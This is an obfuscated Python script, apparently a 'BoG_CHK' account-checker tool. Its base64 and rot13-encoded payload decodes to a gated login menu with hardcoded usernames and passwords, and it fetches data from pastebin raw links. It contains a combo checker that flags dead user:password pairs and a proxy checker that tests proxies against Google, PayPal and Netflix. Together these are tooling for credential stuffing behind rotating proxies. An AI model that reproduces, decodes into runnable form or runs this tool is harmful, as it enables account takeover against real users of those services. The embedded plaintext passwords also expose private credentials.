import base64, codecs
magic = 'I0NIRUNLRVIgVUkKaW1wb3J0IG9zLCBzeXMsIHRpbWUKdHJ5OgogaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICBwcmludCgiIEluc3RhbGxpbmcgcmVxdWVzdHMgTW9kdWxlIikKICBpZiBvcy5uYW1lPT0nbnQnOgogICAgdHJ5OgogICAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCByZXF1ZXN0cycpCiAgICBleGNlcHQ6CiAgICAgIHByaW50ICgiSW5zdGFsbCBQeXRob24tUGlwIFNpciIpCiAgICAgIHJhd19pbnB1dCgnJykKICBlbHNlOgogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgcmVxdWVzdHMnKQoKdHJ5OgogZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQpleGNlcHQ6CiAgcHJpbnQoIiBJbnN0YWxsaW5nIGNvbG9yYW1hIE1vZHVsZSIpCiAgaWYgb3MubmFtZT09J250JzoKICAgIHRyeToKICAgICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgY29sb3JhbWEnKQogICAgZXhjZXB0OgogICAgICBwcmludCAoIkluc3RhbGwgUHl0aG9uLVBpcCBTaXIiKQogICAgICByYXdfaW5wdXQoJycpCiAgZWxzZToKICAgIG9zLnN5c3RlbSgncGlwMyBpbnN0YWxsIGNvbG9yYW1hJykKCnZpdmVzbj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9wV3Z6NmtrcycpLnRleHQKCnZlcnM9cmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNnV0TExLNmgnKS50ZXh0CgpncmF0aXM9cmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvTUZueFI5ZG0iKS50ZXh0CmlmIHN5cy52ZXJzaW9uX2luZm9bMF0gPCAzOgogIGlucHV0ID0gcmF3X2lucHV0CmVsc2U6CiAgcmF3X2lucHV0ID0gaW5wdXQKCmNyZWRpdG9zPTEwMAp3aGlsZSBUcnVlOgoKICAgIAogICAgbmFtZSA9IHJhd19pbnB1dCgnSW5ncmVzZSBzdSBub21icmUgZGUgdXN1YXJpbzogJykKICAgIGlmIG5hbWUgIT0gJ0VtaWxpbycgYW5kIG5hbWUgIT0gJ0VtbWFudWVsJyBhbmQgbmFtZSAhPSAndXNyNTI0JyBhbmQgbmFtZSAhPSAndXNyMTYyJyBhbmQgbmFtZSAhPSAnYm9ndGVzdGVyJyBhbmQgbmFtZSAhPSAnRXJpY2snIGFuZCBuYW1lICE9ICdjaGtncmF0aXMnOgogICAgICAgIHByaW50ICgndXN1YXJpbyBpbmNvcnJlY3RvJykKICAgIGVsc2U6CiAgICAgICAgaWYgbmFtZSA9PSAnRW1pbGlvJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1pbGlvID0gcmF3X2lucHV0KCdJbmdyZXNlIHN1IHBhc3N3b3JkOiAnKQogICAgICAgICAgICAgICAgaWYgcGFzd19FbWlsaW8gIT0gJ0FlMTJ2Y2hsJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICAgIGNyZWRpdG9zLT0xCiAgICAgICAgICAgICAgICAgICAgaWYgY3JlZGl0b3M9PTA6CiAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ0JpZW52ZW5pZG8gTElERVIhICcpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ0VtbWFudWVsJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1tYW51ZWwgPSByYXdfaW5wdXQoJ0luZ3Jlc2Ugc3UgcGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0VtbWFudWVsICE9ICdyb25hbGRpdG8xJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICAgIGNyZWRpdG9zLT0xCiAgICAgICAgICAgICAgICAgICAgaWYgY3JlZGl0b3M9PTA6CiAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ0JpZW52ZW5pZG8gYSBMSURFUicpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ2JvZ3Rlc3Rlcic6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ3RlYW1ib2cnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgaW5jb3JyZWN0YScpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8gQURNSU4nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAnRXJpY2snOgogICAgICAgICAgICAgICAgcGFzd19DYWNhID0gcmF3X2lucHV0KCdJbmdyZXNhIGxhIFBhc3N3b3JkOiAnKQogICAgICAgICAgICAgICAgaWYgcGFzd19DYWNhICE9ICdyYW5hcnVzYSc6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBICcpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8gQURNSU4nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAndXNyMTYyJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnaGF2b2syNTYnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgSU5DT1JSRUNUQSAnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIHByaW50KCdCaWVudmVuaWRvIFNpcicpIAogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAndXNyNTI0JzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnZG9vbTI1Mic6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBICcpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAnY2hrZ3JhdGlzJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19p'
love = 'oaO1qPtaFJ5apzImLFOfLFODLKAmq29lMQbtWlxXVPNtVPNtVPNtVPNtVPNtVTyzVUOup3qsD2SwLFNuCFNaM3WuqTymWmbXVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbW1Oup3A3o3WxVRyBD09FHxIQIRRaXDbtVPNtVPNtVPNtVPNtVPNtVPOyrTy0XPxXVPNtVPNtVPNtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVPNtVPNtVTyzVTqlLKEcpm09WmV0AwN2WmbXVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvDzyyoaMyozyxolVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtLaWyLJfXVPNtVPNtVPNtVPNtVPNtVPNtMJkmMGbXVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvGTRtD3IyoaEuVTSbVTI4pTylLJEiVvxXVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTy0XPxXMTIzVTAfpltcBtbWoTyhqKttCFNaL2kyLKVaPty3nJ5xo3qmVQ0tW2AfplpXPJ9mYaA5p3EyoFuooTyhqKtfVUqcozEiq3AqJ29mYz5uoJHtCG0tW250W10cPzyzVUMcqzImow09VwRvBtbtVTkcqzImL2ueCFYvaWZvPzIfnJLtqzy2MKAhCG0vZPV6PvNtoTy2MKAwnTf9VhXpzPVXMJkmMGbXVPOfnKMyp2Abnm0vFH5HEIWBDHjtEIWFG1VvPvZ9CG09CG09CDccMvO2MKWmCG0vZvV6PvNtpTSmpjcyoTyzVUMypaZtVG0tVwVvBtbtVUOlnJ50XPWVLKxtIJ5uVT51MKMuVUMypaAcj7AhVvxXVPOcoaO1qPtvHSWSH0yCGxRtEH5HEIVtHRSFDFOQG05HFH5IDIVvXDcyoUAyBtbtVUOlnJ50XPWSHyWCHvVcPvZ9CG09CG09CDc0nJ1yYaAfMJIjXQVcPzAfpltcPzWuoz5ypvN9VPVvVtcNDRONDRONVPNtDRONDRONVPNtDRONDRONDPNtPxONVFNtDRONVRONVFNtDRONVPSNDPNtVPNtVPNXDPSNVHNuDPNtDPSNVPNuDPRtVHNuVRNuDPSNVNbuVGbtVPRuVFNuVGbtVPRuVFN6VFRtVPNuVGbtPwb6VQbtBwbtVPN6VQbhVQbtVPN6BvN6BvN6VPNXPvVvVtcxMJLtqUyjMKAwpvumXGbXVPNtVPNtVPOzo3VtLlOcovOmVPftW1khWmbXVPNtVPNtVPNtVPNtVPNtVUA5pl5mqTEiqKDhq3WcqTHbLlxXVPNtVPNtVPNtVPNtVPNtVUA5pl5mqTEiqKDhMzk1p2tbXDbtVPNtVPNtVPNtVPNtVPNtqTygMF5moTIypPtjYwNlXDcjpzyhqPuvLJ5hMKVcPaE5pTImL3VbVxAVEHAYEIWGVP0tDx9UVSASD1IFFIEMKT4vXDcjpzyhqPtvVvVXYwcAEH5IBv4XVPNtVPOQFRIQF0IFHlOCGxkWGxH6VUg9PwRhYFOTDHASDx9CFlOQFRIQF0IFPwVhYFODHx9LJFOQFRIQF0IFVSgOGRjiH0kCI10XZl4gVSOFG1uMVRAVEHAYEIVtJ0uHISNiH3kTDIAHKDb0Yv0tE01OFHjtD0uSD0gSHvNXVvVvYzMipz1uqPufnKMyp2AbnlxcPz51oJAbnlN9VTyhpUI0XPWQnTIwn2IlBvNvXDccMvOhqJ1wnTf9CFVkVwbXVPOcoKOipaDto3ZfVUWypKIyp3EmYPOmrKZfVUEcoJHXVPOcoKOipaDtpzShMT9gPtbtVRuSDHESHvN9VPqpZQZmJmx1oFpXVPOUHxISGvN9VPqpZQZmJmxloFpXVPOMEHkZG1ptCFNaKQNmZ1f5Z20aPvNtHxIRVQ0tW1jjZmAoBGSgWjbtVRAMDH4tCFNaKQNmZ1f5Az0aPvNtHxIGEIDtCFNaKQNmZ1fjoFpXPvNtMTIzVUE5pTImL3Vbplx6PvNtVPNtVPNtVPOzo3VtLlOcovOmVPftW1khWmbXVPNtVPNtVPNtVPNtVPNtVPNtp3ymYaA0MT91qP53pzy0MFuwXDbtVPNtVPNtVPNtVPNtVPNtVPOmrKZhp3Exo3I0YzMfqKAbXPxXVPNtVPNtVPNtVPNtVPNtVPNtqTygMF5moTIypPtjYwNlXDbXPvNtpaImLJptCFNbpzShMT9gYzAbo2ywMFuoW01irzyfoTRiAF4jVPucHTuiozH7VRADIFOcHTuiozHtG1ZtBI8kVTkcn2HtGJSwVR9GVStcVRSjpTkyI2IvF2y0YmLjZF4kYwD2VPuYFSEAGPjtoTyeMFOUMJAeolxtIzIlp2yiov85YwNtGJ9vnJkyYmRmDwR0ZlOGLJMupzxiAwNkYwRaYPqAo3ccoTkuYmHhZPNbGTyhqKt7VRShMUWinJDtZGN7VR1cVRRlXFOOpUOfMIqyLxgcqP81ZmphZmLtXRgVIR1ZYPOfnJgyVRqyL2giXFOQnUWioJHiBQZhZP40ZGNmYwx2VR1iLzyfMFOGLJMupzxiAGZ3YwZ2W10cXDbtVTkcqzHtCFOipTIhXPqwpzSwn2IxYaE4qPpfVPq3WlxXVPOwnPN9VT9jMJ4bW2AbMJAepP50rUDaYPNaqlpcPtbtVTAfpltcPtbtVUOlnJ50XRAMDH4eVvVvPtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvOssS98K3kssPNtVPOssS98K3jtVPNtK3kssS98VPNXVS98VPNtVPNtVPOssPNtVPNtVPNtK3jtVPNtVPNtVNbtK3kssS98VPNtVPNtK3kssPNtVPOssPNtVPNtVPNtPvOssPNtVPNtVPNtVPNtVPNtK3jtVS98VPNtVPNtVPNXVS98VPNtVPNtVPOssS98K3jtVPNtVPOssS98K3jtVNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNXPvVvVvxXVPO0rKOyp2AlXSWSEPfvExSQEHWCG0ftD0uSD0gSHvNiVRWCElOGEHAIHxyHJFNtKT4vX1WSH0IHXDbXPvNtMJ1jLKZtCFOlLKqsnJ5jqKDbHxIRXlqoVI0aX1WSH0IHXlptD29gLz8tBvNaXDbtVUOlo3u5pG1lLKqsnJ5jqKDbHxIRXlWoC10vX1WSH0IHXlWjpz94rGbtVvxXVPOjpz94rFN9VUfXVPNtVPNtVPNvnUE0pUZvVQbtpUWirUykPvNtVPO9PtbtVUE5pTImL3VbVxAVEHAYFH5UVvxXVPOfnJ5eVQ0tW2u0qUOmBv8ioJ9vnJkyYzMuL2Ivo29eYzAioF9fo2qcov5jnUNaPtbXVPObMJSxMKWmVQ0trjbaIKAypv1OM2IhqPptBvOlqKAuMjc9PvNtMJ1jLKZtCFOipTIhXTIgpTSmYPNapvpcYaWyLJEfnJ5ypltcPtbtVTMipvOfnKA0VTyhVTIgpTSmBtbtVPNtVPOgMFN9VTkcp3Dhp3ElnKNbXF5mpTkcqPtaBvpcPtbtVPNtVPOxLKEuVQ0trjbtVPNtVPNaMJ1unJjaBvOgMIfjKFjXVPNtVPNtW3Oup3ZaBvOgMIfkKDbtVPNtVPO9PvNtVPNtVUAbo3DtCFOlMKS1MKA0pl5jo3A0XTkcozffVTuyLJEypaZ9nTIuMTIlpljtMTS0LG1xLKEuYPOjpz94nJImCKOlo3u5XF50MKu0PtbtVPNtVPOcMvNvrTAsoJImp2SaMFVtnJ4tp2uiqQbXVPNtVPNtVPNtVUOlnJ50VPuUHxISGvfvJ0kWIxIqVPVeHxIGEIDeVT1yJmOqVPfvBvVeoJIoZI0cPvNtVPNtVPNtVPOfnKMyYaqlnKEyXPqoGRyJEI0tWlNeVT1yJmOqVPftWlN6VPptXlOgMIfkKFNeVPptCG4tV0WCE19QFRgpovpcPvNtVPNtVTIfnJLtVzAbMJAepT9coaEGqJWgnKEPqKE0o24gLJA0qJSfYJW1qUEiovVtnJ4tp2uiqQbXVPNtVPNtVPNtVUOlnJ50VPuMEHkZG1peVygQFRIQF1OCFH5HKFNvX1WSH0IHXlOgMIfjKFNeVwbvX21yJmSqXDbtVPNtVPNtVPNtL2thq3WcqTHbW1gQFRIQF1OCFH5HKFNaVPftoJIoZS0tXlNaVQbtWlNeVT1yJmSqVPftW1khWlxXVPNtVPNt'
god = 'ZWxpZiAibG9naW5fZXJyb3IiIGluIHNob3Q6CiAgICAgICAgICBwcmludCAoUkVEKyJbRElFXSAiK1JFU0VUKyBtZVswXSArIjoiK21lWzFdKQogICAgICBlbHNlOgogICAgICAgICAgcHJpbnQgKFJFRCsiW0RJRV0gIitSRVNFVCsgbWVbMF0gKyI6IittZVsxXSkKCiAgcHJpbnQgKCJcbkRvbmUuLi5cbiIpCmVsaWYgbnVtY2hrPT0iMiI6CiAgaW1wb3J0IHJlcXVlc3RzCiAgaW1wb3J0IGpzb24KICBpbXBvcnQgc3lzCiAgZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQoKICBjbHMoKQogIHByaW50KEZvcmUuUkVEKycnJwoKICAgICkgICAgICAgICAoICAgICAgICAgICAoICAgICAKICggLyggICAoICAgICApXCApICAgICAgICApXCApICAKIClcKCkpICApXCAgICgoKS8oICAgKCAgICgoKS8oICAKKChfKVwoKCgoXykoICAvKF8pKSAgKVwgICAvKF8pKSAKIF8oKF8pKVwgXyApXChfKSlfICAoKF8pIChfKSkgICAKfCB8fCB8KF8pX1woXyl8ICAgXCB8IF9ffC8gX198ICAKfCBfXyB8IC8gXyBcICB8IHwpIHx8IF98IFxfXyBcICAKfF98fF98L18vIFxfXCB8X19fLyB8X19ffHxfX18vICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICBQcm94eSBDaGVja2VyCiAgICAgICAgCjEtR29vZ2xlCjItUGF5cGFsW0JFU1RdCjMtTmV0ZmxpeAo0LUN1c3RvbSAKJycnKQoKICBnYXRlcz0gaW5wdXQoIkdhdGU6ICIpCiAgaWYgZ2F0ZXM9PSIxIjoKICAgIGdhdG9zPSJodHRwczovL2dvb2dsZS5jb20vIgogICAgYm9uaXRvPSJHb29nbGUiCiAgZWxpZiBnYXRlcz09IjIiOgogICAgZ2F0b3M9Imh0dHBzOi8vcGF5cGFsLmNvbS8iCiAgICBib25pdG89IlBheVBhbCIKICBlbGlmIGdhdGVzPT0iMyI6CiAgICBnYXRvcz0iaHR0cHM6Ly9uZXRmbGl4LmNvbS8iCiAgICBib25pdG89Ik5ldGZsaXgiCiAgZWxpZiBnYXRlcz09IjQiOgogICAgcHJpbnQoIkN1c3RvbSBHYXRlXG4iKQogICAgcHJpbnQoIkV4OiBbaHR0cHM6Ly9leGFtcGxlLmNvbS9dIikKICAgIGdhdG9zID0gaW5wdXQoIkxpbms6ICIpCiAgICBib25pdG89IkN1c3RvbSIKICBlbHNlOgogICAgZ2F0b3M9Imh0dHBzOi8vY3liZXJzc2guY29tLyIKICAgIHByaW50KCJpbnZhbGlkIFtVU0lORyBBVVhJTElBUlkgR0FURV0iKQogICAgYm9uaXRvPSJTU0giCiAgCiAgY2xhc3MgUHJveHlDaGVja2VyKCk6CiAgICAjIENoZWNrIGlmIHByb3h5IGlzIHdvcmtpbmcKICAgICAgZGVmIGNoZWNrUHJveHkoc2VsZiwgcHR5cGUsIHByb3h5aXApOgogICAgICAgICAgaWYgcHR5cGUgPT0gImh0dHBzIjoKICAgICAgICAgICAgICBwcm94eSA9IHsiaHR0cHMiOiAiaHR0cHM6Ly8iICsgcHJveHlpcH0KICAgICAgICAgIGVsaWYgcHR5cGUgPT0gImh0dHAiOgogICAgICAgICAgICAgIHByb3h5ID0geyJodHRwcyI6ICJodHRwczovLyIgKyBwcm94eWlwfQogICAgICAgICAgZWxpZiBwdHlwZSA9PSAic29ja3M1IjoKICAgICAgICAgICAgICBwcm94eSA9IHsiaHR0cCI6ICJzb2NrczU6Ly8iICsgcHJveHlpcCwgImh0dHBzIjogInNvY2tzNWg6Ly8iICsgcHJveHlpcH0KICAgICAgICAgIGVsaWYgcHR5cGUgPT0gInNvY2tzNCI6CiAgICAgICAgICAgICAgcHJveHkgPSB7Imh0dHAiOiAic29ja3M0Oi8vIiArIHByb3h5aXAsICJodHRwcyI6ICJzb2NrczQ6Ly8iICsgcHJveHlpcH0KCiAgICAgICAgICBTZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICByZXNwb25zZSA9IFNlc3Npb24uZ2V0KGdhdG9zLCBwcm94aWVzPXByb3h5LCB0aW1lb3V0PTUpCiAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgcmV0dXJuIHB0eXBlCiAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgIHJldHVybiAiIgoKICAgICMgVmFsaWRhdGUgcHJveHkgdHlwZQogICAgICBkZWYgdmVyaWZ5UHJveHkoc2VsZiwgcHJveHkpOgogICAgICAgICAgcHJveHlfdHlwZSA9ICJJbnZhbGlkIgogICAgICAgICAgcHJveHkgPSBwcm94eS5yZXBsYWNlKCIgIiwgIiIpCiAgICAgICAgICBwcm94eSA9IHByb3h5LnJlcGxhY2UoIlxuIiwgIiIpCiAgICAgICAgICBwcmludChGb3JlLkNZQU4rIkNIRUNLSU5HOiB7fSIuZm9ybWF0KHByb3h5KSkKCiAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgcHJveHlfdHlwZSA9IHNlbGYuY2hlY2tQcm94eSgic29ja3M1IiwgcHJveHkpCiAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICBwcm94eV90eXBlID0gc2VsZi5jaGVja1Byb3h5KCJzb2NrczQiLCBwcm94eSkKICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgIHByb3h5X3R5cGUgPSBzZWxmLmNoZWNrUHJveHkoImh0dHBzIiwgcHJveHkpCiAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICBwcm94eV90eXBlID0gc2VsZi5jaGVja1Byb3h5KCJodHRwIiwgcHJveHkpCiAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgaWYgcHJveHlfdHlwZSAhPSAiSW52YWxpZCI6CiAgICAgICAgICAgICAgcHJpbnQoRm9yZS5HUkVFTisiTGl2ZSEge30gR2F0ZSA9PiB7fSA9PiAjQm9HX0NIS1xuIi5mb3JtYXQocHJveHksIGJvbml0bykpCiAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEKyJEZWFkIHt9IEdhdGUgPT4ge30gPT4gI0JvR19DSEtcbiIuZm9ybWF0KHByb3h5LCBib25pdG8pKQoKICAgICAgZGVmIGNoZWNrTGlzdChzZWxmKToKICAgICAgICAgIHdpdGggb3BlbignLi9wcm94aWVzLnR4dCcsICdyJykgICBhcyBmOgogICAgICAgICAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgICAgICAgICAgIHNlbGYudmVyaWZ5UHJveHkobGluZSkKCgogIGNoZWNrZXIgPSBQcm94eUNoZWNrZXIoKQogIGNoZWNrZXIuY2hlY2tMaXN0KCkKZWxpZiBudW1jaGs9PSIzIjoKICBpbXBvcnQgcmVxdWVzdHMKICBpbXBvcnQgZGF0ZXRpbWUKICBmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlCiAgaW1wb3J0IHRocmVhZGluZwogIGltcG9ydCBzeXMKICBpbXBvcnQgdGltZQoKICBkZWYgZXNjcnAocyk6CiAgICAgICAg'
destiny = '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